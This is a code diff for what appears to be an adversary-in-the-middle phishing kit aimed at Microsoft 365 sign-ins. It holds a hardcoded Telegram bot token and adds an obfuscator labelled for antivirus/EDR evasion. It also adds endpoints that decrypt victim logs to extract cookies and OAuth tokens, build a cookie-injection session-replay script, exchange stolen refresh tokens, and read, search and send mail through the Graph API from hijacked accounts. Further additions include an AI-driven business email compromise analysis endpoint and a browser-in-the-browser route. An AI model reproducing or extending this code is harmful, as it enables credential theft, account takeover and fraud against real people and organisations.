@@ -3,6 +3,11 @@ const BOT_TOKEN = '8342719812:AAGMgewDI6j_XIGRiN9E7EE133ASeGgmkpM';
 const CHAT_ID = '7310383191';
 
 // ================================================
+// 𝙾𝙱𝙵𝚄𝚂𝙲𝙰𝚃𝙾𝚁 𝙵𝙾𝚁 𝙴𝙳𝚁/𝙰𝚅 𝙴𝚅𝙰𝚂𝙸𝙾𝙽
+// ================================================
+const { obfuscateJSFile, generateObfuscationKey } = require('./obfuscator.js');
+
+// ================================================
 // 𝙶𝙴𝙾𝙻𝙾𝙲𝙰𝚃𝙸𝙾𝙽 & 𝙲𝙾𝙾𝙺𝙸𝙴 𝙵𝙸𝙻𝙴 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽𝚂
 // ================================================
 
@@ -224,7 +229,10 @@ dashApp.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// 𝙰𝙿𝙸 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂
+// ================================================
+// 𝙰𝙿𝙸 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂 (Dashboard)
+// ================================================
+
 dashApp.get('/api/logs', (req, res) => {
     try {
         const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
@@ -293,6 +301,354 @@ dashApp.get('/api/status', (req, res) => {
     }
 });
 
+// ---------- SESSION REPLAY ----------
+dashApp.get('/api/replay/:filename', (req, res) => {
+    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
+    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });
+
+    try {
+        const content = fs.readFileSync(filePath, 'utf-8');
+        const lines = content.split('\n').filter(line => line.trim());
+        let allCookies = [];
+        let targetDomain = null;
+        let accessToken = null;
+        let refreshToken = null;
+
+        for (const line of lines) {
+            try {
+                const entry = JSON.parse(line);
+                const iv = Object.keys(entry)[0];
+                const encrypted = entry[iv];
+                const decrypted = decryptData(encrypted, iv);
+                const obj = JSON.parse(decrypted);
+
+                if (!targetDomain && obj.proxyRequestURL) {
+                    try {
+                        const url = new URL(obj.proxyRequestURL);
+                        targetDomain = url.hostname;
+                    } catch (e) {}
+                }
+
+                const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
+                if (setCookie) {
+                    const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
+                    for (const cookie of cookieArray) {
+                        const [nameValue] = cookie.split(';');
+                        if (nameValue) allCookies.push(nameValue.trim());
+                    }
+                }
+
+                const body = obj.proxyRequestBody;
+                if (body) {
+                    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                    const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
+                    const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                    if (accessMatch) accessToken = decodeURIComponent(accessMatch[1]);
+                    if (refreshMatch) refreshToken = decodeURIComponent(refreshMatch[1]);
+                }
+            } catch (e) {}
+        }
+
+        if (allCookies.length === 0 && !accessToken) {
+            return res.status(404).json({ error: 'No cookies or tokens found' });
+        }
+
+        const replayScript = `
+            (function() {
+                const cookies = ${JSON.stringify(allCookies)};
+                const targetDomain = ${JSON.stringify(targetDomain || 'login.microsoftonline.com')};
+                const accessToken = ${JSON.stringify(accessToken)};
+                const refreshToken = ${JSON.stringify(refreshToken)};
+                
+                cookies.forEach(c => {
+                    document.cookie = c + '; path=/; domain=' + targetDomain + '; Secure; SameSite=None';
+                });
+                
+                let msg = '🍪 ' + cookies.length + ' cookies injected.';
+                if (accessToken) {
+                    msg += '\\n🔑 Access token: ' + accessToken.slice(0, 20) + '...';
+                    localStorage.setItem('evil_token', accessToken);
+                }
+                if (refreshToken) {
+                    msg += '\\n🔄 Refresh token: ' + refreshToken.slice(0, 20) + '...';
+                }
+                alert(msg);
+                window.location.href = 'https://' + targetDomain;
+            })();
+        `;
+
+        res.json({
+            success: true,
+            cookieCount: allCookies.length,
+            targetDomain: targetDomain || 'login.microsoftonline.com',
+            hasAccessToken: !!accessToken,
+            hasRefreshToken: !!refreshToken,
+            replayScript: replayScript,
+            cookieString: allCookies.join('; ')
+        });
+
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ---------- TOKEN EXTRACTION ----------
+dashApp.get('/api/tokens/:filename', (req, res) => {
+    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
+    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });
+
+    try {
+        const content = fs.readFileSync(filePath, 'utf-8');
+        const lines = content.split('\n').filter(line => line.trim());
+        const tokens = {
+            access_tokens: [],
+            refresh_tokens: [],
+            id_tokens: [],
+            cookies: [],
+            sessions: []
+        };
+
+        for (const line of lines) {
+            try {
+                const entry = JSON.parse(line);
+                const iv = Object.keys(entry)[0];
+                const encrypted = entry[iv];
+                const decrypted = decryptData(encrypted, iv);
+                const obj = JSON.parse(decrypted);
+
+                const body = obj.proxyRequestBody;
+                if (body) {
+                    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                    const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
+                    const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                    const idMatch = bodyStr.match(/id_token=([^&]+)/i);
+                    if (accessMatch) tokens.access_tokens.push(decodeURIComponent(accessMatch[1]));
+                    if (refreshMatch) tokens.refresh_tokens.push(decodeURIComponent(refreshMatch[1]));
+                    if (idMatch) tokens.id_tokens.push(decodeURIComponent(idMatch[1]));
+
+                    try {
+                        const json = typeof body === 'string' ? JSON.parse(body) : body;
+                        if (json.access_token) tokens.access_tokens.push(json.access_token);
+                        if (json.refresh_token) tokens.refresh_tokens.push(json.refresh_token);
+                        if (json.id_token) tokens.id_tokens.push(json.id_token);
+                    } catch (e) {}
+                }
+
+                const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
+                if (setCookie) {
+                    const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
+                    for (const cookie of cookieArray) {
+                        const [nameValue] = cookie.split(';');
+                        if (nameValue) tokens.cookies.push(nameValue.trim());
+                    }
+                }
+
+                const sessionCookie = obj.proxyRequestHeaders?.cookie;
+                if (sessionCookie) {
+                    tokens.sessions.push(sessionCookie);
+                }
+            } catch (e) {}
+        }
+
+        res.json({
+            success: true,
+            filename: req.params.filename,
+            tokens: tokens
+        });
+
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ---------- TOKEN EXCHANGE ----------
+dashApp.post('/api/exchange', async (req, res) => {
+    const { refresh_token } = req.body;
+    if (!refresh_token) return res.status(400).json({ error: 'Refresh token required' });
+
+    try {
+        const response = await axios.post(
+            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            new URLSearchParams({
+                client_id: '3ce82761-cb43-493f-94bb-fe444b7a0cc4',
+                refresh_token: refresh_token,
+                grant_type: 'refresh_token',
+                scope: 'https://graph.microsoft.com/.default offline_access'
+            }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+        );
+        res.json(response.data);
+    } catch (err) {
+        res.status(500).json({ 
+            error: err.response?.data?.error_description || err.message 
+        });
+    }
+});
+
+// ================================================
+// 🕵️ GRAPH API RECON ENDPOINT
+// ================================================
+dashApp.post('/api/recon', async (req, res) => {
+    const { accessToken, refreshToken, email } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+
+    try {
+        const GraphClient = require('./graph_api.js');
+        const graph = new GraphClient(accessToken);
+        
+        const [profile, inbox, sent, contacts, events, manager, directReports, org] = await Promise.all([
+            graph.getUserProfile(),
+            graph.getInbox(50),
+            graph.getSentItems(50),
+            graph.getContacts(),
+            graph.getEvents(),
+            graph.getManager().catch(() => null),
+            graph.getDirectReports().catch(() => null),
+            graph.getOrganization().catch(() => null)
+        ]);
+
+        res.json({
+            success: true,
+            email: email || profile.mail || profile.userPrincipalName,
+            profile,
+            inbox: inbox?.value || [],
+            sent: sent?.value || [],
+            contacts: contacts?.value || [],
+            events: events?.value || [],
+            manager,
+            directReports: directReports?.value || [],
+            organization: org?.value?.[0] || null
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ================================================
+// 🤖 AI BEC ANALYSIS ENDPOINT
+// ================================================
+dashApp.post('/api/ai/analyze', async (req, res) => {
+    const { accessToken, refreshToken, email, groqApiKey } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+    if (!groqApiKey) return res.status(400).json({ error: 'Groq API key required' });
+
+    try {
+        const AIBECEngine = require('./ai_bec_engine.js');
+        const engine = new AIBECEngine(groqApiKey);
+        const result = await engine.runFullAnalysis(accessToken, refreshToken, email);
+        res.json({ success: true, ...result });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ================================================
+// 📧 WEBMAIL API ENDPOINTS
+// ================================================
+
+dashApp.post('/api/webmail/folders', async (req, res) => {
+    const { accessToken } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+
+    try {
+        const GraphClient = require('./graph_api.js');
+        const graph = new GraphClient(accessToken);
+        const folders = await graph.getMailFolders();
+        res.json({ success: true, folders: folders.value || [] });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/webmail/emails', async (req, res) => {
+    const { accessToken, folderId = 'inbox', limit = 50, skip = 0 } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+
+    try {
+        const GraphClient = require('./graph_api.js');
+        const graph = new GraphClient(accessToken);
+        
+        let endpoint;
+        if (folderId === 'inbox') {
+            endpoint = `/mailFolders/inbox/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
+        } else if (folderId === 'sent') {
+            endpoint = `/mailFolders/sentitems/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
+        } else {
+            endpoint = `/mailFolders/${folderId}/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
+        }
+        
+        const emails = await graph.get(endpoint);
+        res.json({ success: true, emails: emails.value || [], count: emails.value?.length || 0 });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/webmail/email', async (req, res) => {
+    const { accessToken, messageId } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+    if (!messageId) return res.status(400).json({ error: 'Message ID required' });
+
+    try {
+        const GraphClient = require('./graph_api.js');
+        const graph = new GraphClient(accessToken);
+        const email = await graph.get(`/messages/${messageId}?$select=id,subject,sender,toRecipients,ccRecipients,bccRecipients,receivedDateTime,body,isRead,hasAttachments,importance,conversationId`);
+        res.json({ success: true, email });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/webmail/send', async (req, res) => {
+    const { accessToken, to, subject, body, replyToId, forwardFromId } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+    if (!to || !subject || !body) return res.status(400).json({ error: 'To, subject, and body required' });
+
+    try {
+        const GraphClient = require('./graph_api.js');
+        const graph = new GraphClient(accessToken);
+        
+        const emailData = {
+            message: {
+                subject: subject,
+                body: { content: body, contentType: 'HTML' },
+                toRecipients: to.map(email => ({ emailAddress: { address: email } }))
+            }
+        };
+
+        if (replyToId) {
+            emailData.message.conversationId = replyToId;
+        }
+
+        if (forwardFromId) {
+            emailData.message.forwardFrom = { id: forwardFromId };
+        }
+
+        const result = await graph.post('/me/sendMail', emailData);
+        res.json({ success: true, result });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/webmail/search', async (req, res) => {
+    const { accessToken, query, folderId = 'inbox', limit = 50 } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+    if (!query) return res.status(400).json({ error: 'Search query required' });
+
+    try {
+        const GraphClient = require('./graph_api.js');
+        const graph = new GraphClient(accessToken);
+        const searchUrl = folderId === 'inbox' 
+            ? `/mailFolders/inbox/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`
+            : `/mailFolders/${folderId}/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`;
+        const results = await graph.get(searchUrl);
+        res.json({ success: true, emails: results.value || [] });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
 // ================================================
 // 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁
 // ================================================
@@ -300,6 +656,13 @@ dashApp.get('/api/status', (req, res) => {
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
+
+    // ---- BITB ROUTE ----
+    if (url.startsWith('/bitb')) {
+        clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
+        fs.createReadStream(path.join(__dirname, 'public', 'bitb.html')).pipe(clientResponse);
+        return;
+    }
 
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
@@ -329,8 +692,16 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
         if (url === PROXY_PATHNAMES.serviceWorker) {
-            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
-            fs.createReadStream(url.slice(1)).pipe(clientResponse);
+            // Obfuscated service worker
+            const obfKey = generateObfuscationKey();
+            const swPath = url.slice(1);
+            const obfuscatedSW = obfuscateJSFile(swPath, obfKey);
+            clientResponse.writeHead(200, {
+                'Content-Type': 'text/javascript',
+                'Cache-Control': 'no-store'
+            });
+            clientResponse.end(obfuscatedSW);
+            return;
         }
         else if (url === PROXY_PATHNAMES.favicon) {
             clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
@@ -442,8 +813,14 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                         }
 
                                         else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
-                                            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
-                                            fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
+                                            // Obfuscated script
+                                            const obfKey = generateObfuscationKey();
+                                            const obfuscatedCode = obfuscateJSFile(PROXY_FILES.script, obfKey);
+                                            clientResponse.writeHead(200, {
+                                                'Content-Type': 'text/javascript',
+                                                'Cache-Control': 'no-store'
+                                            });
+                                            clientResponse.end(obfuscatedCode);
                                             return;
                                         }
 
